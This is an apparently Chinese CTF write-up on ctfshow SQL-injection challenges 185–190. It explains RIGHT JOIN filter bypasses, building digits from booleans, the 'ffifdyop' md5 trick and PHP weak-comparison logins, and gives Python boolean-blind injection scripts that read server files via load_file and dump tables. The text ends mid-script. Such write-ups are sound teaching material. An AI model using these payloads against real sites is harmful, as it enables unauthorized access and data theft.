<p><a class="link"   href="https://www.runoob.com/sql/sql-join-right.html" >SQL RIGHT JOIN 关键字 | 菜鸟教程 (runoob.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>RIGHT JOIN（右连接）： 用于获取右表所有记录，即使左表没有对应匹配的记录。</strong><br>例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> persons; </span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> position <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> b477eRy  <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> p1       <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> p3       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> p4       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> persons <span class="keyword">as</span> a <span class="keyword">right</span> <span class="keyword">join</span> persons <span class="keyword">as</span> b <span class="keyword">on</span> b.position <span class="operator">=</span><span class="number">3</span>;        </span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> position <span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> position <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> b477eRy  <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> p1       <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> p3       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> p4       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> b477eRy  <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> p1       <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> p3       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> p4       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+----+----------+----------+</span></span><br><span class="line"><span class="number">9</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>

<p><strong>条件有一条记录满足时，记录总数 &#x3D; 总数 * 2 - 1</strong></p>
<p><strong>过滤 ban 了 where，可以用 right&#x2F;left&#x2F;inner join 代替</strong></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://27cf6a1e-36ab-48ce-aac6-5ee561a157d5.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass regexp(0x&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment">## 这里是执行正确时页面上返回的字体</span></span><br><span class="line">true_flag = <span class="string">&quot;$user_count = 43;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 将我们的payload做成16进制的形式，来绕过关键字检查</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">has: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>((has).encode().<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctf&quot;</span>  <span class="comment">## 这里注意表中用 regexp(&#x27;ctf&#x27;) 只有一个结果，要提前给出这一小段 flag 头避免其他记录干扰匹配</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#123;&#125;-&quot;</span> + string.digits + string.ascii_lowercase:</span><br><span class="line">        pd = flag + c</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r[-] 少女折寿中: <span class="subst">&#123;pd&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(make_payload(pd)):</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[+] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Over Sir!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="185-186-禁用了数字和引号，意味着174失效"><a href="#185-186-禁用了数字和引号，意味着174失效" class="headerlink" title="185-186(禁用了数字和引号，意味着174失效)"></a>185-186(禁用了数字和引号，意味着174失效)</h2><p><strong>有过滤的表名位置注入，这次过滤了所有数字，需要自己构造数字，char 转换数组成字符串。</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\##|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>



<h3 id="构造数字"><a href="#构造数字" class="headerlink" title="构造数字"></a>构造数字</h3><p>利用mysql的一些数学函数，构造出数字就行（由于本题还过滤了*，只能硬加了）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20210825152638568-614907953.png"
                      alt="image-20210813215236660"
                ></p>
<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d0c03a5a-c2a1-46a0-90f0-e7dd023f71ee.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## $sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass regexp(char(&#123;&#125;))&quot;</span></span><br><span class="line"><span class="comment">## sql的char()会把里面的数字按逗号依次换为字符，如：char(65,66,67) 就会是 abc ，所以就有了下面的 join操作</span></span><br><span class="line">judge = <span class="string">&quot;$user_count = 43;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">numbermaker</span>(<span class="params">num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;+&quot;</span>.join(<span class="string">&quot;true&quot;</span> <span class="keyword">for</span> koishi <span class="keyword">in</span> <span class="built_in">range</span>(num))</span><br><span class="line">    <span class="comment">## join里面加上for，会循环执行join</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_maker</span>(<span class="params">pay: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>(<span class="string">&quot;,&quot;</span>.join(numbermaker(<span class="built_in">ord</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> pay))</span><br><span class="line">    <span class="comment">## 这个join 在处理数组时，会在每个字符之间添加前面引号的字符，而对于元组，会在元组的每个元素之间添加前面引号内的字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> judge <span class="keyword">in</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfs&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">&quot;-&#123;&#125;&quot;</span> + string.digits + string.ascii_lowercase:</span><br><span class="line">        pd = flag + k</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r[-]少女折寿中ing......  聪明⑨:<span class="subst">&#123;pd&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload_maker(pd)):</span><br><span class="line">            flag += k</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[+] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>



<h1 id="登录类——特性"><a href="#登录类——特性" class="headerlink" title="登录类——特性"></a>登录类——特性</h1><h2 id="187-绕过-md5-str-true"><a href="#187-绕过-md5-str-true" class="headerlink" title="187(  绕过 md5($str,true)  )"></a>187(  绕过 md5($str,true)  )</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin可以获得flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于这种，使用特殊字符串payload：<strong>ffifdyop</strong>  即可绕过</p>
<h2 id="188（有过滤的数字型注入-数据库账号密码列名开头都是字符）"><a href="#188（有过滤的数字型注入-数据库账号密码列名开头都是字符）" class="headerlink" title="188（有过滤的数字型注入_数据库账号密码列名开头都是字符）"></a>188（有过滤的数字型注入_数据库账号密码列名开头都是字符）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查询语句</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//返回逻辑</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><p>当列的类型为 string 时，在查询限制条件中使用数字会将字符串转为数字进行比较，非数字开头的字符串会被转化为数字 0</p>
<p>在比较查询的时候，查询语句为：<code>select pass from ctfshow_user where username = 0 and password = 0;</code>，由于<code>username password</code>是字符串，弱比较成了0,而0&#x3D;0成立，所条件就成立了；最后查询语句就成了：<code>select pass from ctfshow_user where 1;</code></p>
<p><a class="link"   href="https://www.cnblogs.com/mrsm1th/p/6745532.html" >php弱类型总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><strong>在 php 中，当一个字符串当作一个数值来取值，其结果和类型如下: 如果该字符串没有包含 ‘.’，’e’，’E’ 并且其数值值在整形的范围之内该字符串被当作 int 来取值，其他所有情况下都被作为 float 来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</strong></p>
<p><code>$row[&#39;pass&#39;]</code> 为 string 类型，若第一个字符不是数字就会被转换为数字 0。尝试在 password 填写数字 0，成功绕过。</p>
<p><strong>故本题账号密码都使用 0 即可</strong></p>
<h2 id="web189（数据库列名的开头不止一个是数字）"><a href="#web189（数据库列名的开头不止一个是数字）" class="headerlink" title="web189（数据库列名的开头不止一个是数字）"></a>web189（数据库列名的开头不止一个是数字）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>有过滤的数字型注入，尝试上一题的解法不能绕过，password <strong>不止第一个字符是数字</strong>，不能被转换为 0。<br>正则很多东西<strong>没有过滤</strong>，可以利用 username 筛选条件 0 和 1 的回显不同，读文件布尔盲注 flag（0是密码错误，1是查询失败）</p>
<h3 id="尝试写exp"><a href="#尝试写exp" class="headerlink" title="尝试写exp"></a>尝试写exp</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="comment">## 这里的url需要注意一下，题目说明flag在 /api/index.php中，所以我们不能傻乎乎的直接用 /select-waf.php ,之前写完脚本还一直不知道拿错了</span></span><br><span class="line">url = <span class="string">&quot;http://50df699d-c52e-4dce-8ef0-3ce85d9970eb.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"><span class="comment">## sql 的 locate 语句：返回字符串中第一次出现的子字符串的位置。   LOCATE(substring(需要查找的字符串), string(查找范围), start（可不填，默认字符串起始位置）)</span></span><br><span class="line"><span class="comment">## 使用 if 判断我们的flag字符串位置是否大于index（由于0，1页面返回值不同，我们可以利用这种方式布尔盲注）</span></span><br><span class="line">location_payload = <span class="string">&quot;if(locate(&#x27;ctfshow&#x27;,load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;index&#125;,0,1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 二分法查找flag的起始位置</span></span><br><span class="line">def <span class="title function_ invoke__">find_flag_index</span>() -&gt; <span class="keyword">int</span>:</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="title function_ invoke__">not</span> (<span class="title function_ invoke__">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) <span class="comment">// 2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: location_payload.<span class="title function_ invoke__">format</span>(index=p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.<span class="title function_ invoke__">post</span>(url, data=data)</span><br><span class="line">        <span class="comment">## \u5bc6\u7801\u9519\u8bef 是中文 ”密码错误“ 的unicode编码</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> in response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">return</span> end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[-] ⑨酱正在努力查找flag位置  =￣ω￣=&quot;</span>)</span><br><span class="line">flag_location = <span class="title function_ invoke__">find_flag_index</span>()</span><br><span class="line"><span class="keyword">print</span>(f<span class="string">&quot;[^_^] ⑨:本天才找到flag位置是：&#123;flag_location&#125;&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;c&quot;</span></span><br><span class="line">flag_location += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[-] ⑨酱正在努力注入获取flag确切值 ｡◕‿◕｡ &quot;</span>)</span><br><span class="line">injection_payload = <span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,0,1)&quot;</span></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>] != <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="title function_ invoke__">not</span> (<span class="title function_ invoke__">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) <span class="comment">// 2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: injection_payload.<span class="title function_ invoke__">format</span>(flag_location, p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.<span class="title function_ invoke__">post</span>(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> in response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    flag += <span class="title function_ invoke__">chr</span>(end)</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[(*o &gt;Д&lt;)o] flag是: &#123;flag&#125;&quot;</span>)</span><br><span class="line">    flag_location += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p><strong>脚本写的多少带点我都个人爱好 &#x3D; w &#x3D;</strong></p>
<h1 id="布尔盲注（莫得回显，淦！）"><a href="#布尔盲注（莫得回显，淦！）" class="headerlink" title="布尔盲注（莫得回显，淦！）"></a>布尔盲注（莫得回显，淦！）</h1><h2 id="190-这题账号也是数字开头的了"><a href="#190-这题账号也是数字开头的了" class="headerlink" title="190(这题账号也是数字开头的了)"></a>190(这题账号也是数字开头的了)</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">   <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">   <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//密码判断</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">     <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br></pre></td></tr></table></figure></div>



<p><strong>有过滤的字符型注入，没有给出过滤的正则表达式，在 username 处构造 payload 布尔盲注。</strong><br><strong>先查表名，再查列名，再用列名和表名构造 payload 查 flag。</strong></p>
<p><strong>由于是字符型注入，还是尝试万能密码 1’ or ‘1’&#x3D;’1，发现可以使用，回显   “密码错误”    与 “用户名不存在”  不同，可以尝试bool</strong>  </p>
<h3 id="exp编写-1"><a href="#exp编写-1" class="headerlink" title="exp编写"></a>exp编写</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5be0cea3-6e88-4794-8aa5-2dfcd4666080.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 表名 : ctfshow_fl0g ,  ctfshow_user</span></span><br><span class="line"><span class="comment">## payload = &quot;0&#x27; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 列名 id,f1ag,id,username,pass</span></span><br><span class="line"><span class="comment">## payload = &quot;0&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"></span><br><span class="line">judge = <span 